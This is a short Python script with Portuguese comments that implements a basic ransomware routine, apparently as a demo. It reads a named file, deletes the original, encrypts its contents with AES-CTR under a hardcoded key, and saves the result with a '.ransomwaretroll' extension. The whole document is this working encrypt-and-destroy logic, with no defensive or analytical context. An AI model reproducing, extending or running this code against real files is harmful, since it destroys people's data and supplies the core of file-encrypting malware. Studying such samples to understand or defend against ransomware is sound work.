import os
import pyaes

## abrir o arquivo a ser criptografado
nome_arquivo = "arquivo.txt"
arquivo = open(nome_arquivo, "rb")
dados_arquivo = arquivo.read()
arquivo.close()

## remover o arquivo
os.remove(nome_arquivo)

## chave de criptografia
chave = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(chave)

## criptografar o arquivo
dados_criptografar = aes.encrypt(dados_arquivo)

## salvar o arquivo criptografado
novo_arquivo = nome_arquivo + ".ransomwaretroll"
novo_arquivo = open(f'{novo_arquivo}','wb')
novo_arquivo.write(dados_criptografar)
novo_arquivo.close()
